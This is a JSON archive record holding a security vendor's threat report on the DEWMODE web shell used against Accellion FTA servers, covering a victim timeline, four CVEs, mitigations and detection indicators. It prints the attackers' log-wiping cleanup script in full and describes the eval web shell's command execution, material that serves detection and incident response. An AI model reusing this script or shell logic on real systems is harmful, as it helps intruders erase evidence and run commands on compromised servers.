{
    "id": "60f199be-0518-4fff-a960-2ef2ba5aeeb7",
    "created_at": "2022-10-25T16:48:13.445798Z",
    "updated_at": "2025-03-27T02:16:09.675947Z",
    "deleted_at": null,
    "sha1_hash": "43efb6c5afe0b2afc8fb2693115eabe1cba2b7d8",
    "title": "DEWMODE Web Shell Used on Accellion FTA Appliances",
    "authors": "",
    "file_creation_date": "2021-03-11T18:06:58Z",
    "file_modification_date": "2021-03-12T09:22:13Z",
    "file_size": 1073697,
    "plain_text": "### MALWARE/\n\n TOOL\n\n PROFILE\n\n## By Insikt Group®\n\nMTP-2021-0312\n\n# DEWMODE Web Shell Used on\n\n\n-----\n\n#### Key Judgments\n\n                                      - The Accellion FTA data breach was enabled by\n\n4 zero-day vulnerabilities, with initial access\ngained through an SQL injection vulnerability,\nCVE-2021-27101.\n\n                                      - Based on the changes in statements from\n\nAccellion over the course of reporting on this\ncampaign, the company may still not be fully\n\n_This report provides a high-level overview of the Accellion File_ aware of the extent of compromise associated\n_Transfer Appliance compromise and analysis of the DEWMODE webshell_ with these vulnerabilities. Furthermore, based\n_employed in the resulting breaches. Insikt Group used open source_\n\non the number of industries and countries that\n\n_research (OSINT), PolySwarm, malware analysis, and the Recorded_\n_Future® Platform to execute this research. The target audience of this_ include clients of Accellion, we suspect that\n_research includes day-to-day security practitioners as well executive_ future reports of Accellion FTA exploitation\n_decision-makers concerned about targeting of third-party systems and_\n_software._ will disclose more companies, industries, and\n\ncountries than have previously been reported.\n\n#### Executive Summary\n\n\nThe compromise of the Accellion File Transfer\nAppliance (FTA) file sharing service impacting nearly 100\nclients of the company was enabled primarily by 4 zeroday vulnerabilities in the tool that allowed threat actors\nto place the DEWMODE web shell on victim servers\nand exfiltrate files from those servers. As of February\n25, 2021, 13 organizations in multiple sectors (finance,\ngovernment, legal, education, telecommunications,\nhealthcare, retail, and manufacturing) and multiple\ncountries (Australia, New Zealand, Singapore, the UK,\nand the US) have suffered data breaches as a result of\nthe Accellion FTA compromise. Victim data has appeared\non the website CL0P LEAKS, establishing a link between\nthe operators of this website and the attackers behind\nthe Clop ransomware. There are likely to be reports of\nadditional victims in the near future, and we suspect\nthat these victims will be part of additional industries\nand countries beyond what have already been reported.\nClients using Accellion FTA in their environment are\nadvised to update the software to version FTA_9_12_416\nor later and employ Insikt Group’s recommended\nmitigations to look for related malicious behavior on\nthese servers.\n\n\n#### Background\n\nOn January 10, 2021, the [Reserve Bank of New](https://www.reuters.com/article/us-newzealand-economy-rbnz/new-zealand-central-bank-says-its-data-system-was-breached-idINKBN29F010)\n[Zealand reported a data breach due to compromise](https://www.reuters.com/article/us-newzealand-economy-rbnz/new-zealand-central-bank-says-its-data-system-was-breached-idINKBN29F010)\nof a third-party file sharing service, shortly afterward\nidentified as Accellion. The bank released a [statement](https://www.rbnz.govt.nz/news/2021/01/reserve-bank-response-to-illegal-breach-of-data-system)\nabout the breach a day later, in which they stated that the\nbreach may have exposed commercially and personally\nsensitive information. Reserve Bank governor Adrian Orr\nsaid it had been advised by Accellion that the Reserve\nBank was not specifically targeted and that other users\nof Accellion FTA were also compromised.\n\nShortly afterward, on January 12, Accellion stated\nin a [press release that “less than 50 customers” were](https://www.accellion.com/company/press-releases/accellion-responds-to-recent-fta-security-incident/)\naffected by a “P0 vulnerability” in its legacy FTA\nsoftware. They further claimed that they first learned\nof the vulnerability in mid-December 2020, and that\na patch was subsequently released “in 72 hours with\nminimal impact”.\n\n\n-----\n\n#### Threat Analysis\n\nWithin a few weeks after Accellion’s initial press release,\nmultiple other companies disclosed data breaches that occurred\ndue to exploitation of Accellion FTA. Additionally, data of victims\nof Accellion FTA compromise began to appear on the website\nCL0P LEAKS, establishing a link between the operators of this\nwebsite and the attackers behind the Clop ransomware. Based\non an updated number of potential victims disclosed by Accellion\non February 22, and an expanding list of victims up to the time\nof writing (February 24), we expect additional similar reports to\nappear over the next month. The following timeline tracks new\nvictim disclosures, security researcher analysis, and updates\nfrom Accellion itself.\n\n[• January 22 — Australian law firm Allens reports a data](https://www.afr.com/companies/financial-services/allens-victim-of-high-profile-cyber-attack-20210122-p56w8g)\n\nbreach due to Accellion FTA compromise.\n\n[• January 25 — The Australian Securities and Investment](https://asic.gov.au/about-asic/news-centre/news-items/accellion-cyber-incident/)\n\n[Commission discloses that on January 15, it became](https://asic.gov.au/about-asic/news-centre/news-items/accellion-cyber-incident/)\naware of a data breach due to Accellion FTA compromise.\n\n[• February 2 — US law firm Goodwin Procter, the first](https://www.law.com/americanlawyer/2021/02/02/goodwin-points-to-third-party-vendor-as-root-of-data-breach/)\n\nnon-Australian or New Zealand victim, discloses a data\nbreach due to Accellion FTA compromise.\n\n[• February 4 — The Office of the US Washington State](https://sao.wa.gov/breach2021/)\n\n[Auditor discloses a data breach due to Accellion FTA](https://sao.wa.gov/breach2021/)\ncompromise.\n\n[• February 9 — Open sources report that the University](https://www.cu.edu/accellion-cyberattack)\n\n[of Colorado suffered a data breach due to Accellion FTA](https://www.cu.edu/accellion-cyberattack)\ncompromise.\n\n  - February 11 — Singaporean telecommunications company\n\n[Singtel and Australian medical research institute QIMR](https://www.singtel.com/about-Us/news-releases/media-statement-relating-to-acelions-fta-security-incident-)\n[Berghofer disclose data breaches due to Accellion FTA](https://www.qimrberghofer.edu.au/media-releases/qimr-berghofer-investigates-suspected-accellion-data-breach/)\ncompromise. QIMR Berghofer claims it was asked by\nAccellion to implement an emergency patch on January\n4; then on February 2, Accellion warned the institute that\nthey might have been compromised.\n\n[• February 16 — US law firm Jones Day confirms a data](https://www.law.com/americanlawyer/2021/02/16/jones-day-2nd-big-law-victim-of-accellion-breach/)\n\n[breach due to Accellion FTA compromise. On its GitHub](https://github.com/accellion/CVEs)\n[page, Accellion publishes descriptions of 4 vulnerabilities](https://github.com/accellion/CVEs)\nin its FTA software: CVE-2021-27101, CVE-2021-27102,\nCVE-2021-27103, and CVE-2021-27104.\n\n[• February 17 — Open sources report that Jones Day data](https://www.nzherald.co.nz/business/data-breach-reserve-bank-likely-facing-250k-ransom-files-from-other-victims-made-public/BXEKUKAXYCU5JFLR2IMJOCQYFE/)\n\nhas appeared on the CL0P LEAKS extortion website,\nintroducing the possibility that other organizations\ncompromised via Accellion FTA will face similar data\nexposure from these criminals.\n\n[• February 19 — US grocery chain Kroger discloses data](https://www.kroger.com/i/accellion-incident)\n\nbreach due to Accellion FTA compromise.\n\n\n\n  - February 21 — Recorded Future data confirms the\n\nappearance of Jones Day data on the CL0P LEAKS\nwebsite.\n\n[• February 22 — FireEye releases a blog detailing links](https://www.fireeye.com/blog/threat-research/2021/02/accellion-fta-exploited-for-data-theft-and-extortion.html)\n\nbetween the Accellion FTA breaches and a group known\nas UNC2546, the cybercrime group FIN11, the operators\nof the extortion site for data stolen via Clop ransomware\nattacks, and a web shell called DEWMODE. On the\n[same day, Accellion releases a statement that “out of](https://www.accellion.com/company/press-releases/accellion-provides-update-to-fta-security-incident-following-mandiants-preliminary-findings/)\napproximately 300 total FTA clients, fewer than 100 were\nvictims of the attack”.\n\n  - February 23 — Canadian airplane manufacturer\n\n[Bombardier and Australian government agency Transport](https://www.itworldcanada.com/article/bombardier-latest-victim-of-accellion-fta-related-data-theft/442828)\n[for NSW disclose data breaches due to Accellion FTA](https://www.zdnet.com/article/transport-for-nsw-confirms-data-taken-in-accellion-data-breach/)\ncompromise.\n\n  - February 24 — Recorded Future logs data exposures\n\nfor Singtel and Bombardier on the CL0P Leaks website.\n[Five Eyes members issue a joint advisory regarding](https://us-cert.cisa.gov/ncas/alerts/aa21-055a)\nongoing attacks exploiting Accellion FTA vulnerabilities.\nThe advisory states that impacted organizations are in\n“Australia, New Zealand, Singapore, the United Kingdom\n\n[from which no organizations have yet disclosed a data\nbreach], and the United States”. An open source report\n[discloses that US health insurance company Centene](https://healthitsecurity.com/news/cisa-warns-of-accellion-fta-exploit-centene-among-breach-victims)\nis another victim of data breach due to Accellion FTA\ncompromise.\n\nAccellion’s commentary on the scope of potential exploitation\nhas changed since their original disclosure. On January 12, the\ncompany stated that fewer than 50 customers were impacted;\nby February 22, the company had amended this to fewer than\n100 out of 300 total FTA clients.\n\nThe graph below shows that the public sector has been\nmost impacted by exploitation of the Accellion FTA vulnerability.\nHowever, based on the distribution of customer industries as\n[publicized by Accellion, we suspect that the healthcare, finance,](https://www.accellion.com/customers/)\nand energy sectors have been impacted more heavily than has\nbeen publicly reported.\n\n\n#### Threat Analysis\n\n\n-----\n\n**_Figure 1: Distribution of industries for publicly disclosed victims of Accellion FTA vulnerability exploitation (light blue) versus_**\n_distribution of industries for high-profile customers as listed on Accellion’s website (dark blue) (Source: Recorded Future)_\n\n\nWe anticipate that the countries identified by the Five Eyes\nreport and our research as hosting victims of Accellion FTA\ncompromise (Australia, Canada, New Zealand, Singapore, the\nUK, and the US) are and will continue to be the most impacted\nby this series of attacks based on the distribution of victims\nso far. However, we do not believe that these attacks are\n\n\nbased on narrow targeting of these countries. Additionally, as\nthe map below shows, there are several other countries that\nhost customers of Accellion (and therefore potential victims of\nexploitation), including France, Germany, Israel, Italy, Japan, and\n\nthe Netherlands.\n\n\n**_Figure 2: Countries impacted by exploitation of Accellion FTA. The countries in red (Australia, Canada, New Zealand, Singapore, the UK, and the US) are headquarters for confirmed victims_**\n_of Accellion FTA exploitation The countries in orange (France Germany Israel Italy Japan and the Netherlands) are headquarters for other customers of Accellion as publicized on their_\n\n\n-----\n\n#### Technical Analysis\n\nWhile Insikt Group does not have direct insight into how\nthe breach was conducted, reporting from [other researchers](https://www.guidepointsecurity.com/accellion-fta-targeted-by-file-downloading-web-shell/)\n[indicates that the initial steps of the attack were:](https://www.fireeye.com/blog/threat-research/2021/02/accellion-fta-exploited-for-data-theft-and-extortion.html)\n\n  - First, the threat actor gained access to the Accellion FTA\n\nserver through a pre-auth SQL injection vulnerability,\nCVE-2021-27101. FireEye cites 3 other vulnerabilities,\nCVE-2021-27102, CVE-2021-27103 and CVE-2021-27104,\nthat were exploited as part of the breach, but Insikt\nGroup has no insight into the specifics of this exploitation\nfrom currently available evidence.\n\n  - Next, the threat actor used the access to the SQL\n\ndatabase to obtain a key that was used in conjunction\nwith a file called “sftp_account_edit.php”.\n\n  - This enabled the threat actor to write an eval web shell\n\nto the server to the file “/home/seos/courier/oauth.\napi”. This web shell looks for a key passed to the php\ncode called “token”, and proceeds to base64-decode\nthe value and run it as php code. If the web shell finds\na “username” key, it executes the value as a system\ncommand on the server.\n\n[• FireEye suggests that this eval web shell may have been](https://www.fireeye.com/blog/threat-research/2021/02/accellion-fta-exploited-for-data-theft-and-extortion.html)\n\nused to write the DEWMODE web shell to disk, based on\nthe timing of the request, but does not have evidence\nfor the exact method used to write the web shell to the\nserver\n\n  - The DEWMODE web shell was observed in 1 of 2\n\nlocations on the server:\n\n     - /home/seos/courier/about.html\n\n     - /home/httpd/html/about.html\n\nThe threat actor’s exploitation of zero-day vulnerabilities in\nAccellion FTA was key to gaining access to, and then proceeding\nto further exploit, these servers. It is not clear at this time\nwhether the threat actor found these vulnerabilities themselves,\nwhich would suggest technical sophistication, or whether they\npurchased them from another actor.\n\n##### Technical Analysis of DEWMODE\n\nInsikt Group analyzed 2 copies of the DEWMODE web shell\n[highlighted by FireEye.](https://www.fireeye.com/blog/threat-research/2021/02/accellion-fta-exploited-for-data-theft-and-extortion.html)\n\n**_Figure 3: DEWMODE web shell UI (Source: Recorded Future)_**\n\n\n**_Figure 4: DEWMODE web shell if no files of interest are found (Source: Recorded Future)_**\n\nThe DEWMODE web shell is very small, approximately 80\nlines of php code, and has relatively simple functionality that\nallows the threat actor to view and download files of interest.\n\n  - When the DEWMODE web shell is accessed, it displays\n\nfiles of interest as seen in Figure 3, above. This file list\nis generated by accessing a MySQL database on the\nFTA server and provides a list of these files for the user\nto download. In the case that there are no files, or the\nweb shell is unable to find them, the message in Figure\n4, above, is displayed and the web shell goes through its\n“cleanup”.\n\n  - Download requests to the web shell are executed\n\nthrough a GET request, with encrypted file path and\nfilename parameters, as seen below. Insikt Group does\nnot have access to the functionality associated with the\n“decrypt” function to determine what type of encryption\nis being used for these parameters. This functionality is\nlikely contained in 1 of 2 code files imported by the script\nthat we do not have access to:\n\n    - Request:\n\nGET</ filepath/>about.html?dwn[=encrypted path to\n\ndownload&]fn[=encrypted filename to download]\n\n    - Response:\n\n\n-----\n\nIf the web shell receives a GET request with the key\n“csrftoken” and value “11454bd782bb41db213d415e10a0fb3c”,\nit will perform a cleanup of itself, which entails deletion of the\nweb shell from the server, and the writing of the command seen\nin Figure 5 below (reformatted for clarity) to a temporary file at\n/tmp/.scr. This script does the following:\n\n  - For each log in the server’s Apache logs located in /var/\n\nopt/apache, put all lines not containing references to\n“about.html” (as noted by the -v parameter to grep) into\na temporary file, located at /tmp/x. Overwrite the original\nlogfile with this temporary file, and delete the temporary\nfile.\n\n  - Overwrite the contents of adminpl.log with nothing.\n\n  - Remove the DEWMODE web shell (about.html) and the\n\neval web shell (oauth.api) and redirect the output to /\ntmp/.out (to prevent logging).\n\n  - Allow anyone to read, write or execute /tmp/.out and set\n\nthe owner to “nobody” to obfuscate who created the file.\n\n  - Overwrite /var/log/secure with nothing.\n\n  - The threat actors also delete /tmp/.scr and /tmp/.out\n\nafter the script executes.\n\n#!/bin/sh\n\nfor log in `ls /var/opt/apache/*log*`;\n\ndo\n\ncat $log 2>/dev/null | grep -v ‘about.html’ > /tmp/x;\n\nmv /tmp/x $log;\n\nrm -rf /tmp/x;\n\ndone\n\necho -n > /home/seos/log/adminpl.log;\n\nrm -rf /home/httpd/html/about.html > /tmp/.out\n\nrm -rfv /home/httpd/html/oauth.api > /tmp/.out\n\nchmod 777 /tmp/.out\n\nchown nobody:nobody /tmp/.out\n\necho > /var/log/secure\n\n_Figure 5: DEWMODE web shell cleanup command from file_\n_bdfd11b1b092b7c61ce5f02ffc5ad55a (Source: Recorded Future)_\n\nThe attacker’s cleanup procedure associated with the\nDEWMODE web shell is fairly thorough, even adjusting the logs\nthat could indicate malicious behavior associated with the web\nshell. Additionally, rather than fully deleting these logs, which\nwould likely look suspicious to a system administrator, the threat\nactor modifies the logs to remove the lines with “about.html” in\nthem. However, depending on how long the threat actor spent\nbetween the deployment of the web shell and the cleanup, if\nthe organization is exporting or otherwise saving the log files\nto another location, references to “about.html” would remain\nin those egressed logs allowing for incident response efforts\n\n\n##### Vulnerabilities Used in Breach\n\nFour vulnerabilities were cited in association with the\nAccellion FTA data breach, specifically CVE-2021-27101, CVE2021-27102, CVE-2021-27103 and CVE-2021-27104.\n\n##### CVE-2021-27101\n\n**RF Risk Score( 79 :High)**\n\n**NIST Base Score( 9.8 :Critical)**\n\n**Description :This vulnerability is an SQL injection**\nvia a crafted Host header in a request to document_\nroot.html that was exploited to enable initial access to\nAccellion FTA servers .It affects software versions FTA\n370_12_9and earlier.\n\n**Mitigation :Update Accellion FTA software to**\nversion FTA 380_12_9_or later.\n\n##### CVE-2021-27102\n\n**RF Risk Score( 58 :Medium)**\n\n**NIST Base Score( 7.8 :High)**\n\n**Description :This vulnerability is an OS command**\nexecution via a local web service call affecting\nsoftware versions FTA 411_12_9 and earlier.\n\n**Mitigation :Update Accellion FTA software to**\nversion FTA 416_12_9_or later.\n\n##### CVE-2021-27103\n\n**RF Risk Score( 74 :High)**\n\n**NIST Base Score( 9.8 :Critical)**\n\n**Description :This vulnerability is a server-side**\nrequest forgery( SSRF )via a crafted POST request to\nwmProgressstat.html affecting software version FTA\n411_12_9and earlier.\n\n**Mitigation :Update Accellion FTA software to**\nversion FTA 416_12_9_or later.\n\n##### CVE-2021-27104\n\n**RF Risk Score( 74 :High)**\n\n**NIST Base Score( 9.8 :Critical)**\n\n**Description :This vulnerability is an OS command**\nexecution via a crafted POST request to various admin\nendpoints affecting software versions FTA370_12_9\nand earlier.\n\n**Mitigation :Update Accellion FTA software to**\nversion FTA 380_12_9_or later.\n\n\n-----\n\n#### Mitigations\n\nWhile TTPs used in the Accellion breach and in association\nwith the DEWMODE web shell have become widely publicized,\nand threat actors may modify them to evade detection, Insikt\nGroup advises the following mitigations:\n\n  - Monitor third-party risk to your organization from this\n\ncampaign. Potential monitoring parameters can include\npublicly reported cyberattacks against companies that\nuse Accellion FTA, new references to leaked data on\nthe CL0P LEAKS website, and threat groups or malware\nassociated with UNC2546, FIN11, or Clop ransomware.\n\n  - Accellion has released patches for all of the\n\nvulnerabilities associated with this breach, and\norganizations using Accellion FTA servers should update\nto version FTA_9_12_416.\n\n     - If a system is running Accellion FTA, consider\n\nisolating the system from the internet until\npatches can be applied.\n\n     - If malicious behavior is identified, CISA\n\n[recommends resetting the “W1” encryption token](https://us-cert.cisa.gov/ncas/alerts/aa21-055a)\nand any other security tokens on the system.\n\n[• Accellion’s FTA product will be reaching end of](https://www.accellion.com/sites/default/files/resources/fta-eol.pdf)\n\nlife on April 30, 2021. Clients using the product\nshould consider alternative options for file-sharing\nplatforms to migrate to as the EOL approaches for\nFTA.\n\nIf your organization was running a vulnerable version\nof Accellion FTA, an incident response investigation should\nbe undertaken to determine whether there was a breach.\nThe following methods may be used to examine log data for\nindications of a compromise.\n\n\n\n- Organizations should monitor for network requests\n\nassociated with the DEWMODE web shell, including:\n\n   - GET requests to /about.html?dwn=[encrypted\n\npath]&fn=[encrypted filename]\n\n   - GET requests to /about\n\ntml?csrftoken=11454bd782bb41db213d415e10\na0fb3c\n\n   - GET requests to /about.html?aid=1000\n\n[• According to CISA, there was an incident in which](https://us-cert.cisa.gov/ncas/alerts/aa21-055a)\n\na large amount of data was exfiltrated on port 443\nto 194.88.104[.]24 and another in which several\nTCP sessions had IP address 45.135.229[.]179.\n\n- The following file system events were associated with\n\nthe breach:\n\n   - Creation of “about.html” in /home/seos/courier or /\n\nhome/httpd/html\n\n    - Writes to the file /courier/oauth.api, where data\n\ncontained matches the description of the eval\nshell, above\n\n   - Accesses to /courier/document_root.html, or /\n\ncourier/sftp_account_edit.php\n\n   - Several modifications to logs contained in the\n\nApache log directory, /var/opt/apache\n\n- While other researchers have linked this threat activity\n\nwith varying degrees of confidence to the threat actors\n[behind Clop ransomware, Insikt Group does not have](https://www.fireeye.com/blog/threat-research/2021/02/accellion-fta-exploited-for-data-theft-and-extortion.html)\nenough information to confirm or refute this.\n\n\n-----\n\n#### Outlook\n\nBased on the changes in statements from Accellion over\nthe course of reporting on this campaign, the company may\nstill not be fully aware of the extent of compromise associated\nwith these vulnerabilities. Furthermore, based on the number\nof industries and countries that include clients of Accellion, we\nsuspect that future reports of Accellion FTA exploitation will\ndisclose more companies, industries, and countries than have\npreviously been reported.\n\nAs products approach end of life, such as Accellion FTA,\nthey are likely to have less developer support, and update\noversight moving forward. Organizations with software or\nhardware in their technology stack that has reached end of life\nor is approaching it should continue to monitor these products\nand develop migration strategies for these tools to more current,\nsupported tools.\n\n\n-----\n\nAbout Recorded Future\n\nRecorded Future is the world’s largest provider of intelligence for enterprise\n\nsecurity. By combining persistent and pervasive automated data collection and analytics\n\nwith human analysis, Recorded Future delivers intelligence that is timely, accurate,\n\nand actionable. In a world of ever-increasing chaos and uncertainty, Recorded Future\n\nempowers organizations with the visibility they need to identify and detect threats\n\nfaster; take proactive action to disrupt adversaries; and protect their people, systems,\n\nand assets, so business can be conducted with confidence. Recorded Future is trusted\n\nby more than 1,000 businesses and government organizations around the world.\n\nLearn more at recordedfuture.com and follow us on Twitter at @RecordedFuture.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://go.recordedfuture.com/hubfs/reports/mtp-2021-0312.pdf"
    ],
    "report_names": [
        "mtp-2021-0312.pdf"
    ],
    "threat_actors": [
        {
            "id": "6728f306-6259-4e7d-a4ea-59586d90a47d",
            "created_at": "2023-01-06T13:46:39.175292Z",
            "updated_at": "2025-03-27T02:00:03.013291Z",
            "deleted_at": null,
            "main_name": "FIN11",
            "aliases": [
                "TEMP.Warlock",
                "UNC902"
            ],
            "source_name": "MISPGALAXY:FIN11",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "5e6b31a6-80e3-4e7d-8b0a-d94897ce9b59",
            "created_at": "2024-06-19T02:03:08.128175Z",
            "updated_at": "2025-03-27T02:05:17.400394Z",
            "deleted_at": null,
            "main_name": "GOLD TAHOE",
            "aliases": [
                "SectorJ04 ",
                "Spandex Tempest ",
                "TA505 ",
                "FIN11 "
            ],
            "source_name": "Secureworks:GOLD TAHOE",
            "tools": [
                " Cobalt Strike",
                " FlawedAmmy",
                " Get2",
                " GraceWire",
                " Malichus",
                " SDBbot",
                " ServHelper",
                " TrueBot",
                "Clop"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "1db21349-11d6-4e57-805c-fb1e23a8acab",
            "created_at": "2022-10-25T16:07:23.630365Z",
            "updated_at": "2025-03-27T02:02:09.897138Z",
            "deleted_at": null,
            "main_name": "FIN11",
            "aliases": [
                "DEV-0950",
                "Lace Tempest",
                "Operation Cyclone"
            ],
            "source_name": "ETDA:FIN11",
            "tools": [
                "AZORult",
                "Amadey",
                "AmmyyRAT",
                "AndroMut",
                "BLUESTEAL",
                "Cl0p",
                "EMASTEAL",
                "FLOWERPIPE",
                "FORKBEARD",
                "FRIENDSPEAK",
                "FlawedAmmyy",
                "GazGolder",
                "Get2",
                "GetandGo",
                "JESTBOT",
                "MINEBRIDGE",
                "MINEBRIDGE RAT",
                "MINEDOOR",
                "MIXLABEL",
                "Meterpreter",
                "NAILGUN",
                "POPFLASH",
                "PuffStealer",
                "Rultazo",
                "SALTLICK",
                "SCRAPMINT",
                "SHORTBENCH",
                "SLOWROLL",
                "SPOONBEARD",
                "TiniMet",
                "TinyMet",
                "VIDAR",
                "Vidar Stealer"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716493,
    "ts_updated_at": 1743041769,
    "ts_creation_date": 1615486018,
    "ts_modification_date": 1615540933,
    "files": {
        "pdf": "https://archive.orkl.eu/43efb6c5afe0b2afc8fb2693115eabe1cba2b7d8.pdf",
        "text": "https://archive.orkl.eu/43efb6c5afe0b2afc8fb2693115eabe1cba2b7d8.txt",
        "img": "https://archive.orkl.eu/43efb6c5afe0b2afc8fb2693115eabe1cba2b7d8.jpg"
    }
}